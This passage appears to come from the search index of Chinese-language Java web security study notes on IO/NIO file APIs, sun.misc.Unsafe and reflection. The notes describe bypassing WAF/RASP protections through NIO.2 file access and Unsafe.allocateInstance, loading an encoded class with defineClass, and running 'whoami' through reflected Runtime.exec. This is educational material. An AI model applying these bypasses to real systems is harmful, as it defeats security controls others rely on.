\u662f\u4e00\u4e2a\u62bd\u8c61\u7c7b\uff0c\u5b83\u62bd\u8c61\u4e86\u5bf9\u6587\u4ef6\u7684\u64cd\u4f5c\uff0c\u4e0d\u540c\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\u7684JDK\u4f1a\u5b9e\u73b0\u5176\u62bd\u8c61\u7684\u65b9\u6cd5\u4ece\u800c\u4e5f\u5c31\u5b9e\u73b0\u4e86\u8de8\u5e73\u53f0\u7684\u6587\u4ef6\u7684\u8bbf\u95ee\u64cd\u4f5c\u3002 \u9700\u8981\u6ce8\u610f\u7684\u70b9\u6709\uff1a 1. \u5e76\u4e0d\u662f\u6240\u6709\u7684\u6587\u4ef6\u64cd\u4f5c\u90fd\u5728 java.io.FileSystem \u4e2d\u5b9a\u4e49,\u6587\u4ef6\u7684\u8bfb\u53d6\u6700\u7ec8\u8c03\u7528\u7684\u662f java.io.FileInputStream#read0\u3001readBytes \u3001 java.io.RandomAccessFile#read0\u3001readBytes ,\u800c\u5199\u6587\u4ef6\u8c03\u7528\u7684\u662f java.io.FileOutputStream#writeBytes \u3001 java.io.RandomAccessFile#write0 \u3002 2. Java\u6709\u4e24\u7c7b\u6587\u4ef6\u7cfb\u7edfAPI\uff01\u4e00\u4e2a\u662f\u57fa\u4e8e \u963b\u585e\u6a21\u5f0f\u7684IO \u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u53e6\u4e00\u662fJDK7+\u57fa\u4e8e NIO.2 \u7684\u6587\u4ef6\u7cfb\u7edf\u3002","title":"JAVA IO \u6587\u4ef6\u7cfb\u7edf"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/JAVA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/#fileinputstream","text":"```java package top.longlone; import java.io.ByteArrayOutputStream; import java.io.File; import java.io.FileInputStream; public class FileStudy { public static void main(String[] args) throws Exception { File file = new File(\"C:\\Users\\11624\\Desktop\\test.txt\"); FileInputStream fileInputStream = new FileInputStream(file); int a = 0; byte[] bytes = new byte[1024]; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); while ((a = fileInputStream.read(bytes)) != -1) { byteArrayOutputStream.write(bytes, 0, a); } System.out.println(byteArrayOutputStream.toString()); } } \u4f7f\u7528\u4f8b\u5b50\u5982\u4e0a\u3002 ### FileOutputStream ```java package top.longlone; import java.io.File; import java.io.FileOutputStream; import java.nio.charset.StandardCharsets; public class FileStudy { public static void main(String[] args) throws Exception { File file = new File(\"C:\\\\Users\\\\11624\\\\Desktop\\\\test2.txt\"); String content = \"Hello world.\"; FileOutputStream fileOutputStream = new FileOutputStream(file); fileOutputStream.write(content.getBytes(StandardCharsets.UTF_8)); fileOutputStream.flush(); fileOutputStream.close(); } } \u4f7f\u7528\u4f8b\u5b50\u5982\u4e0a\u3002","title":"FileInputStream"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/JAVA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/#java-nio2-\u6587\u4ef6\u7cfb\u7edf","text":"Java 7\u63d0\u51fa\u4e86\u4e00\u4e2a\u57fa\u4e8eNIO\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u8fd9\u4e2aNIO\u6587\u4ef6\u7cfb\u7edf\u548c\u963b\u585eIO\u6587\u4ef6\u7cfb\u7edf\u4e24\u8005\u662f\u5b8c\u5168\u72ec\u7acb\u7684\u3002 java.nio.file.spi.FileSystemProvider \u5bf9\u6587\u4ef6\u7684\u5c01\u88c5\u548c java.io.FileSystem \u540c\u7406\u3002 NIO\u7684\u6587\u4ef6\u64cd\u4f5c\u5728\u4e0d\u540c\u7684\u7cfb\u7edf\u7684\u6700\u7ec8\u5b9e\u73b0\u7c7b\u4e5f\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u6bd4\u5982Mac\u7684\u5b9e\u73b0\u7c7b\u662f: sun.nio.fs.UnixNativeDispatcher ,\u800cWindows\u7684\u5b9e\u73b0\u7c7b\u662f sun.nio.fs.WindowsNativeDispatcher \u3002 \u5408\u7406\u7684\u5229\u7528NIO\u6587\u4ef6\u7cfb\u7edf\u8fd9\u4e00\u7279\u6027\u6211\u4eec\u53ef\u4ee5\u7ed5\u8fc7\u67d0\u4e9b\u53ea\u662f\u9632\u5fa1\u4e86 java.io.FileSystem \u7684 WAF / RASP","title":"JAVA NIO.2 \u6587\u4ef6\u7cfb\u7edf"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/Unsafe/","text":"Unsafe # sun.misc.Unsafe \u662fJava\u5e95\u5c42API( \u4ec5\u9650Java\u5185\u90e8\u4f7f\u7528,\u53cd\u5c04\u53ef\u8c03\u7528 )\u63d0\u4f9b\u7684\u4e00\u4e2a\u795e\u5947\u7684Java\u7c7b\uff0c Unsafe \u63d0\u4f9b\u4e86\u975e\u5e38\u5e95\u5c42\u7684 \u5185\u5b58\u3001CAS\u3001\u7ebf\u7a0b\u8c03\u5ea6\u3001\u7c7b\u3001\u5bf9\u8c61 \u7b49\u64cd\u4f5c\u3001 Unsafe \u6b63\u5982\u5b83\u7684\u540d\u5b57\u4e00\u6837\u5b83\u63d0\u4f9b\u7684\u51e0\u4e4e\u6240\u6709\u7684\u65b9\u6cd5\u90fd\u662f\u4e0d\u5b89\u5168\u7684\uff0c\u672c\u8282\u53ea\u8bb2\u89e3\u5982\u4f55\u4f7f\u7528 Unsafe \u5b9a\u4e49Java\u7c7b\u3001\u521b\u5efa\u7c7b\u5b9e\u4f8b\u3002 \u7531\u4e8eUnsafe\u662f\u7981\u6b62\u5916\u90e8\u8c03\u7528\u7684,\u6211\u4eec\u53ef\u4ee5\u5148\u770b\u770bUnsafe\u7684\u4ee3\u7801\u7247\u6bb5,\u770b\u770b\u5982\u4f55\u901a\u8fc7\u53cd\u5c04\u83b7\u53d6Unsafe\u5b9e\u4f8b import sun.reflect.CallerSensitive ; import sun.reflect.Reflection ; public final class Unsafe { private static final Unsafe theUnsafe ; static { theUnsafe = new Unsafe (); \u7701\u53bb\u5176\u4ed6\u4ee3\u7801 ...... } private Unsafe () { } @CallerSensitive public static Unsafe getUnsafe () { Class var0 = Reflection . getCallerClass (); if ( var0 . getClassLoader () != null ) { throw new SecurityException ( \"Unsafe\" ); } else { return theUnsafe ; } } ... } \u83b7\u53d6Unsafe\u5b9e\u4f8b # \u6211\u4eec\u4ece\u4e0a\u9762\u7684\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\u67092\u79cd\u65b9\u5f0f\u83b7\u53d6Unsafe\u5b9e\u4f8b,\u4ee5\u4e0b\u5206\u522b\u4ecb\u7ecd\u4e0b\u8fd9\u4e24\u79cd\u65b9\u5f0f. \u8c03\u7528\u79c1\u6709\u6784\u9020\u65b9\u6cd5 # public static void main ( String [] args ) throws Exception { Class <?> unsafeClass = Class . forName ( \"sun.misc.Unsafe\" ); Constructor <?> declaredConstructor = unsafeClass . getDeclaredConstructor (); declaredConstructor . setAccessible ( true ); Unsafe unsafe = ( Unsafe ) declaredConstructor . newInstance (); System . out . println ( unsafe ); } \u83b7\u53d6\u79c1\u6709\u5c5e\u6027theUnsafe # public static void main ( String [] args ) throws Exception { Class <?> unsafeClass = Class . forName ( \"sun.misc.Unsafe\" ); Field theUnsafe = unsafeClass . getDeclaredField ( \"theUnsafe\" ); theUnsafe . setAccessible ( true ); Unsafe unsafe = ( Unsafe ) theUnsafe . get ( null ); System . out . println ( unsafe ); } allocateInstance\u65e0\u89c6\u6784\u9020\u65b9\u6cd5\u521b\u5efa\u7c7b\u5b9e\u4f8b # \u5047\u8bbe\u6211\u4eec\u6709\u4e00\u4e2a\u53eb UnSafeTest \u7684\u7c7b\uff0c\u56e0\u4e3a\u67d0\u79cd\u539f\u56e0\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u901a\u8fc7\u53cd\u5c04\u7684\u65b9\u5f0f\u53bb\u521b\u5efa UnSafeTest \u7c7b\u5b9e\u4f8b\uff0c\u90a3\u4e48\u8fd9\u4e2a\u65f6\u5019\u4f7f\u7528 Unsafe \u7684 allocateInstance \u65b9\u6cd5\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u8fd9\u4e2a\u9650\u5236\u4e86\u3002 package top.longlone ; import sun.misc.Unsafe ; import java.lang.reflect.Constructor ; import java.lang.reflect.Field ; class UnsafeTest { private UnsafeTest () { System . out . println ( \"success\" ); }} public class UnsafeStudy { public static void main ( String [] args ) throws Exception { Class <?> unsafeClass = Class . forName ( \"sun.misc.Unsafe\" ); Field theUnsafe = unsafeClass . getDeclaredField ( \"theUnsafe\" ); theUnsafe . setAccessible ( true ); Unsafe unsafe = ( Unsafe ) theUnsafe . get ( null ); UnsafeTest unsafeTest = ( UnsafeTest ) unsafe . allocateInstance ( UnsafeTest . class ); System . out . println ( unsafeTest ); }} Google\u7684 GSON \u5e93\u5728JSON\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u5c31\u4f7f\u7528\u8fd9\u4e2a\u65b9\u5f0f\u6765\u521b\u5efa\u7c7b\u5b9e\u4f8b\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\u4e5f\u4f1a\u7ecf\u5e38\u9047\u5230\u8fd9\u6837\u7684\u9650\u5236\uff0c\u6bd4\u5982RASP\u9650\u5236\u4e86 java.io.FileInputStream \u7c7b\u7684\u6784\u9020\u65b9\u6cd5\u5bfc\u81f4\u6211\u4eec\u65e0\u6cd5\u8bfb\u6587\u4ef6\u6216\u8005\u9650\u5236\u4e86 UNIXProcess/ProcessImpl \u7c7b\u7684\u6784\u9020\u65b9\u6cd5\u5bfc\u81f4\u6211\u4eec\u65e0\u6cd5\u6267\u884c\u672c\u5730\u547d\u4ee4\u7b49\u3002 defineClass\u76f4\u63a5\u8c03\u7528JVM\u521b\u5efa\u7c7b\u5bf9\u8c61 # package top.longlone ; import sun.misc.Unsafe ; import java.lang.reflect.Constructor ; import java.lang.reflect.Field ; import java.lang.reflect.Method ; import java.security.CodeSource ; import java.security.ProtectionDomain ; import java.security.cert.Certificate ; import java.util.Base64 ; public class UnsafeStudy { private static final String TEST_CLASS_NAME = \"top.longlone.Hello\" ; private static final byte [] TEST_CLASS_BYTES = Base64 . getDecoder (). decode ( \"yv66vgAAADQAJAoABwARCgASABMJAAYAFAkAFQAWCgAXABgHABkHABoBAAZudW1iZXIBABNMamF2YS9sYW5nL0ludGVnZXI7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAB2Rpc3BsYXkBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwACgALBwAbDAAcAB0MAAgACQcAHgwAHwAgBwAhDAAiACMBABJ0b3AvbG9uZ2xvbmUvSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL0ludGVnZXIBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgAhAAYABwAAAAEAAgAIAAkAAAACAAEACgALAAEADAAAACkAAgABAAAADSq3AAEqBLgAArUAA7EAAAABAA0AAAAKAAIAAAADAAQABAABAA4ACwABAAwAAAAnAAIAAQAAAAuyAAQqtAADtgAFsQAAAAEADQAAAAoAAgAAAAYACgAHAAEADwAAAAIAEA==\" ); public static void main ( String [] args ) throws Exception { Class <?> unsafeClass = Class . forName ( \"sun.misc.Unsafe\" ); Field theUnsafe = unsafeClass . getDeclaredField ( \"theUnsafe\" ); theUnsafe . setAccessible ( true ); Unsafe unsafe = ( Unsafe ) theUnsafe . get ( null ); // \u83b7\u53d6\u7cfb\u7edf\u7684\u7c7b\u52a0\u8f7d\u5668 ClassLoader classLoader = ClassLoader . getSystemClassLoader (); // \u521b\u5efa\u9ed8\u8ba4\u7684\u4fdd\u62a4\u57df ProtectionDomain domain = new ProtectionDomain ( new CodeSource ( null , ( Certificate [] ) null ), null , classLoader , null ); // \u76f4\u63a5\u8c03\u7528JVM\u521b\u5efa\u7c7b\u5bf9\u8c61 Class <?> helloClass = unsafe . defineClass ( TEST_CLASS_NAME , TEST_CLASS_BYTES , 0 , TEST_CLASS_BYTES . length , classLoader , domain ); Constructor <?> declaredConstructor = helloClass . getDeclaredConstructor (); declaredConstructor . setAccessible ( true ); Object o = declaredConstructor . newInstance (); Method displayMethod = helloClass . getDeclaredMethod ( \"display\" ); Object result = displayMethod . invoke ( o ); } }","title":"Unsafe"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/Unsafe/#unsafe","text":"sun.misc.Unsafe \u662fJava\u5e95\u5c42API( \u4ec5\u9650Java\u5185\u90e8\u4f7f\u7528,\u53cd\u5c04\u53ef\u8c03\u7528 )\u63d0\u4f9b\u7684\u4e00\u4e2a\u795e\u5947\u7684Java\u7c7b\uff0c Unsafe \u63d0\u4f9b\u4e86\u975e\u5e38\u5e95\u5c42\u7684 \u5185\u5b58\u3001CAS\u3001\u7ebf\u7a0b\u8c03\u5ea6\u3001\u7c7b\u3001\u5bf9\u8c61 \u7b49\u64cd\u4f5c\u3001 Unsafe \u6b63\u5982\u5b83\u7684\u540d\u5b57\u4e00\u6837\u5b83\u63d0\u4f9b\u7684\u51e0\u4e4e\u6240\u6709\u7684\u65b9\u6cd5\u90fd\u662f\u4e0d\u5b89\u5168\u7684\uff0c\u672c\u8282\u53ea\u8bb2\u89e3\u5982\u4f55\u4f7f\u7528 Unsafe \u5b9a\u4e49Java\u7c7b\u3001\u521b\u5efa\u7c7b\u5b9e\u4f8b\u3002 \u7531\u4e8eUnsafe\u662f\u7981\u6b62\u5916\u90e8\u8c03\u7528\u7684,\u6211\u4eec\u53ef\u4ee5\u5148\u770b\u770bUnsafe\u7684\u4ee3\u7801\u7247\u6bb5,\u770b\u770b\u5982\u4f55\u901a\u8fc7\u53cd\u5c04\u83b7\u53d6Unsafe\u5b9e\u4f8b import sun.reflect.CallerSensitive ; import sun.reflect.Reflection ; public final class Unsafe { private static final Unsafe theUnsafe ; static { theUnsafe = new Unsafe (); \u7701\u53bb\u5176\u4ed6\u4ee3\u7801 ...... } private Unsafe () { } @CallerSensitive public static Unsafe getUnsafe () { Class var0 = Reflection . getCallerClass (); if ( var0 . getClassLoader () != null ) { throw new SecurityException ( \"Unsafe\" ); } else { return theUnsafe ; } } ... }","title":"Unsafe"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/Unsafe/#\u83b7\u53d6unsafe\u5b9e\u4f8b","text":"\u6211\u4eec\u4ece\u4e0a\u9762\u7684\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\u67092\u79cd\u65b9\u5f0f\u83b7\u53d6Unsafe\u5b9e\u4f8b,\u4ee5\u4e0b\u5206\u522b\u4ecb\u7ecd\u4e0b\u8fd9\u4e24\u79cd\u65b9\u5f0f.","title":"\u83b7\u53d6Unsafe\u5b9e\u4f8b"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/Unsafe/#\u8c03\u7528\u79c1\u6709\u6784\u9020\u65b9\u6cd5","text":"public static void main ( String [] args ) throws Exception { Class <?> unsafeClass = Class . forName ( \"sun.misc.Unsafe\" ); Constructor <?> declaredConstructor = unsafeClass . getDeclaredConstructor (); declaredConstructor . setAccessible ( true ); Unsafe unsafe = ( Unsafe ) declaredConstructor . newInstance (); System . out . println ( unsafe ); }","title":"\u8c03\u7528\u79c1\u6709\u6784\u9020\u65b9\u6cd5"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/Unsafe/#\u83b7\u53d6\u79c1\u6709\u5c5e\u6027theunsafe","text":"public static void main ( String [] args ) throws Exception { Class <?> unsafeClass = Class . forName ( \"sun.misc.Unsafe\" ); Field theUnsafe = unsafeClass . getDeclaredField ( \"theUnsafe\" ); theUnsafe . setAccessible ( true ); Unsafe unsafe = ( Unsafe ) theUnsafe . get ( null ); System . out . println ( unsafe ); }","title":"\u83b7\u53d6\u79c1\u6709\u5c5e\u6027theUnsafe"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/Unsafe/#allocateinstance\u65e0\u89c6\u6784\u9020\u65b9\u6cd5\u521b\u5efa\u7c7b\u5b9e\u4f8b","text":"\u5047\u8bbe\u6211\u4eec\u6709\u4e00\u4e2a\u53eb UnSafeTest \u7684\u7c7b\uff0c\u56e0\u4e3a\u67d0\u79cd\u539f\u56e0\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u901a\u8fc7\u53cd\u5c04\u7684\u65b9\u5f0f\u53bb\u521b\u5efa UnSafeTest \u7c7b\u5b9e\u4f8b\uff0c\u90a3\u4e48\u8fd9\u4e2a\u65f6\u5019\u4f7f\u7528 Unsafe \u7684 allocateInstance \u65b9\u6cd5\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u8fd9\u4e2a\u9650\u5236\u4e86\u3002 package top.longlone ; import sun.misc.Unsafe ; import java.lang.reflect.Constructor ; import java.lang.reflect.Field ; class UnsafeTest { private UnsafeTest () { System . out . println ( \"success\" ); }} public class UnsafeStudy { public static void main ( String [] args ) throws Exception { Class <?> unsafeClass = Class . forName ( \"sun.misc.Unsafe\" ); Field theUnsafe = unsafeClass . getDeclaredField ( \"theUnsafe\" ); theUnsafe . setAccessible ( true ); Unsafe unsafe = ( Unsafe ) theUnsafe . get ( null ); UnsafeTest unsafeTest = ( UnsafeTest ) unsafe . allocateInstance ( UnsafeTest . class ); System . out . println ( unsafeTest ); }} Google\u7684 GSON \u5e93\u5728JSON\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u5c31\u4f7f\u7528\u8fd9\u4e2a\u65b9\u5f0f\u6765\u521b\u5efa\u7c7b\u5b9e\u4f8b\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\u4e5f\u4f1a\u7ecf\u5e38\u9047\u5230\u8fd9\u6837\u7684\u9650\u5236\uff0c\u6bd4\u5982RASP\u9650\u5236\u4e86 java.io.FileInputStream \u7c7b\u7684\u6784\u9020\u65b9\u6cd5\u5bfc\u81f4\u6211\u4eec\u65e0\u6cd5\u8bfb\u6587\u4ef6\u6216\u8005\u9650\u5236\u4e86 UNIXProcess/ProcessImpl \u7c7b\u7684\u6784\u9020\u65b9\u6cd5\u5bfc\u81f4\u6211\u4eec\u65e0\u6cd5\u6267\u884c\u672c\u5730\u547d\u4ee4\u7b49\u3002","title":"allocateInstance\u65e0\u89c6\u6784\u9020\u65b9\u6cd5\u521b\u5efa\u7c7b\u5b9e\u4f8b"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/Unsafe/#defineclass\u76f4\u63a5\u8c03\u7528jvm\u521b\u5efa\u7c7b\u5bf9\u8c61","text":"package top.longlone ; import sun.misc.Unsafe ; import java.lang.reflect.Constructor ; import java.lang.reflect.Field ; import java.lang.reflect.Method ; import java.security.CodeSource ; import java.security.ProtectionDomain ; import java.security.cert.Certificate ; import java.util.Base64 ; public class UnsafeStudy { private static final String TEST_CLASS_NAME = \"top.longlone.Hello\" ; private static final byte [] TEST_CLASS_BYTES = Base64 . getDecoder (). decode ( \"yv66vgAAADQAJAoABwARCgASABMJAAYAFAkAFQAWCgAXABgHABkHABoBAAZudW1iZXIBABNMamF2YS9sYW5nL0ludGVnZXI7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAB2Rpc3BsYXkBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwACgALBwAbDAAcAB0MAAgACQcAHgwAHwAgBwAhDAAiACMBABJ0b3AvbG9uZ2xvbmUvSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL0ludGVnZXIBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgAhAAYABwAAAAEAAgAIAAkAAAACAAEACgALAAEADAAAACkAAgABAAAADSq3AAEqBLgAArUAA7EAAAABAA0AAAAKAAIAAAADAAQABAABAA4ACwABAAwAAAAnAAIAAQAAAAuyAAQqtAADtgAFsQAAAAEADQAAAAoAAgAAAAYACgAHAAEADwAAAAIAEA==\" ); public static void main ( String [] args ) throws Exception { Class <?> unsafeClass = Class . forName ( \"sun.misc.Unsafe\" ); Field theUnsafe = unsafeClass . getDeclaredField ( \"theUnsafe\" ); theUnsafe . setAccessible ( true ); Unsafe unsafe = ( Unsafe ) theUnsafe . get ( null ); // \u83b7\u53d6\u7cfb\u7edf\u7684\u7c7b\u52a0\u8f7d\u5668 ClassLoader classLoader = ClassLoader . getSystemClassLoader (); // \u521b\u5efa\u9ed8\u8ba4\u7684\u4fdd\u62a4\u57df ProtectionDomain domain = new ProtectionDomain ( new CodeSource ( null , ( Certificate [] ) null ), null , classLoader , null ); // \u76f4\u63a5\u8c03\u7528JVM\u521b\u5efa\u7c7b\u5bf9\u8c61 Class <?> helloClass = unsafe . defineClass ( TEST_CLASS_NAME , TEST_CLASS_BYTES , 0 , TEST_CLASS_BYTES . length , classLoader , domain ); Constructor <?> declaredConstructor = helloClass . getDeclaredConstructor (); declaredConstructor . setAccessible ( true ); Object o = declaredConstructor . newInstance (); Method displayMethod = helloClass . getDeclaredMethod ( \"display\" ); Object result = displayMethod . invoke ( o ); } }","title":"defineClass\u76f4\u63a5\u8c03\u7528JVM\u521b\u5efa\u7c7b\u5bf9\u8c61"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/","text":"\u53cd\u5c04\u673a\u5236 # \u901a\u8fc7java\u53cd\u5c04\u6211\u4eec\u53ef\u4ee5\u5b9e\u73b0\u52a8\u6001\u5730\u83b7\u53d6\u4ee5\u4e0b\u4e1c\u897f\uff1a - \u7c7b - \u5b9e\u4f8b - \u65b9\u6cd5\uff0c\u8c03\u7528\u65b9\u6cd5 - \u5c5e\u6027\uff0c\u5c5e\u6027\u503c - ... \u83b7\u53d6Class\u5bf9\u8c61 # \u6709\u4e09\u79cd\u65b9\u6cd5\u83b7\u53d6Class\u5bf9\u8c61\uff1a 1. \u7c7b\u540d.class 2. Class.forName(\"\") 3. classLoader.loadClass(\"\"); \u83b7\u53d6\u6570\u7ec4\u7c7b\u578b\u7684Class\u5bf9\u8c61\u6bd4\u8f83\u7279\u6b8a\uff1a Class <?> doubleArray = Class . forName ( \"[D\" ); //\u76f8\u5f53\u4e8edouble[].class Class <?> cStringArray = Class . forName ( \"[[Ljava.lang.String;\" ); // \u76f8\u5f53\u4e8eString[][].class \u53cd\u5c04\u83b7\u53d6java.lang.Runtime # package top.longlone ; import sun.misc.IOUtils ; import java.io.InputStream ; import java.lang.reflect.Constructor ; import java.lang.reflect.Method ; public class ReflectionStudy { public static void main ( String [] args ) throws Exception { // \u53cd\u5c04\u83b7\u53d6Runtime\u7c7b Class <?> runtimeClass = Class . forName ( \"java.lang.Runtime\" ); // \u53cd\u5c04\u83b7\u53d6\u7c7b\u7684\u6784\u9020\u5668\uff0c\u56e0\u4e3a\u5b83\u662f\u79c1\u6709\u7684\u6240\u4ee5\u8981\u8bbe\u7f6eAccessible Constructor <?> constructor = runtimeClass . getDeclaredConstructor (); constructor . setAccessible ( true ); // \u83b7\u53d6Runtime\u5b9e\u4f8b Object runtimeInstance = constructor . newInstance (); // \u83b7\u53d6exec\u65b9\u6cd5 Method exec = runtimeClass . getMethod ( \"exec\" , String . class ); // \u53cd\u5c04\u8c03\u7528exec\u65b9\u6cd5\u5e76\u83b7\u53d6\u7ed3\u679c Process process = ( Process ) exec . invoke ( runtimeInstance , \"whoami\" ); InputStream inputStream = process . getInputStream (); System . out . println ( new String ( IOUtils . readAllBytes ( inputStream ))); } } \u53cd\u5c04\u8c03\u7528\u7c7b\u65b9\u6cd5 # \u83b7\u53d6\u6210\u5458\u65b9\u6cd5 # \u83b7\u53d6\u5f53\u524d\u7c7b\u6240\u6709\u7684\u6210\u5458\u65b9\u6cd5\uff1a Method [] methods = clazz . getDeclaredMethods () \u83b7\u53d6\u5f53\u524d\u7c7b\u6307\u5b9a\u7684\u6210\u5458\u65b9\u6cd5\uff1a Method method = clazz . getDeclaredMethod ( \"\u65b9\u6cd5\u540d\" ); Method method = clazz . getDeclaredMethod ( \"\u65b9\u6cd5\u540d\" , \u53c2\u6570\u7c7b\u578b\u5982String . class \uff0c \u591a\u4e2a\u53c2\u6570\u7528 \",\" \u53f7\u9694\u5f00 ); getMethod\u4e0egetDeclaredMethod\u7684\u533a\u522b # getMethod \u80fd\u83b7\u53d6 \u5f53\u524d\u7c7b\u548c\u7236\u7c7b \u7684\u6240\u6709\u6709\u6743\u9650\u65b9\u6cd5\uff08\u5982public\uff09 getDeclaredMethod \u80fd\u83b7\u53d6 \u5f53\u524d\u7c7b \u7684\u6240\u6709\u65b9\u6cd5 \u53cd\u5c04\u8c03\u7528\u7c7b\u65b9\u6cd5 # method . invoke ( \u65b9\u6cd5\u5b9e\u4f8b\u5bf9\u8c61 , \u65b9\u6cd5\u53c2\u6570\u503c \uff0c \u591a\u4e2a\u53c2\u6570\u503c\u7528 \",\" \u9694\u5f00 ); \u53cd\u5c04\u83b7\u53d6\u548c\u4fee\u6539\u5c5e\u6027 # \u83b7\u53d6\u5f53\u524d\u7c7b\u7684\u6240\u6709\u6210\u5458\u53d8\u91cf # Field fields = clazz . getDeclaredFields (); \u83b7\u53d6\u5f53\u524d\u7c7b\u6307\u5b9a\u7684\u6210\u5458\u53d8\u91cf # Field field = clazz . getDeclaredField ( \"\u53d8\u91cf\u540d\" ); getField \u548c getDeclaredField \u7684\u533a\u522b\u540c getMethod \u548c getDeclaredMethod \u83b7\u53d6\u6210\u5458\u53d8\u91cf\u503c # Object obj = field . get ( \u7c7b\u5b9e\u4f8b\u5bf9\u8c61 ); \u4fee\u6539\u6210\u5458\u53d8\u91cf\u503c # field . set ( \u7c7b\u5b9e\u4f8b\u5bf9\u8c61 , \u4fee\u6539\u540e\u7684\u503c ); \u793a\u4f8b # package top.longlone ; import java.lang.reflect.Constructor ; import java.lang.reflect.Field ; class NumberTest { private Integer number ; public NumberTest () { number = 1 ; } public void display () { System . out . println ( \"Number is \" + number ); } } public class ReflectionStudy { public static void main ( String [] args ) throws Exception { // \u83b7\u53d6NumberTest\u7c7b Class <?> testClass = Class . forName ( \"top.longlone.NumberTest\" ); // \u83b7\u53d6NumberTest\u4e2d\u7684number\u5c5e\u6027\u5e76\u8bbe\u7f6e\u53ef\u8bbf\u95ee\uff08\u56e0\u4e3a\u662f\u79c1\u6709\u7684\uff09 Field numberField = testClass . getDeclaredField ( \"number\" ); numberField . setAccessible ( true ); // \u83b7\u53d6NumberTest\u6784\u9020\u5668 Constructor <?> testConstructor = testClass . getConstructor (); // \u83b7\u53d6NumberTest\u5b9e\u4f8b NumberTest testInstance = ( NumberTest ) testConstructor . newInstance (); // \u83b7\u53d6\u5b9e\u4f8b\u4e2d\u7684number\u5c5e\u6027\u503c\uff0c\u6b64\u65f6\u4e3a1 Integer number = ( Integer ) numberField . get ( testInstance ); // \u8bbe\u7f6e\u5b9e\u4f8b\u4e2d\u7684number\u5c5e\u6027\u503c\u4e3a\u539f\u6765\u7684+1 numberField . set ( testInstance , number + 1 ); // \u8f93\u51fa\u7ed3\u679c\uff0c\u4e3a2 testInstance . display (); } }","title":"\u53cd\u5c04\u673a\u5236"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/#\u53cd\u5c04\u673a\u5236","text":"\u901a\u8fc7java\u53cd\u5c04\u6211\u4eec\u53ef\u4ee5\u5b9e\u73b0\u52a8\u6001\u5730\u83b7\u53d6\u4ee5\u4e0b\u4e1c\u897f\uff1a - \u7c7b - \u5b9e\u4f8b - \u65b9\u6cd5\uff0c\u8c03\u7528\u65b9\u6cd5 - \u5c5e\u6027\uff0c\u5c5e\u6027\u503c - 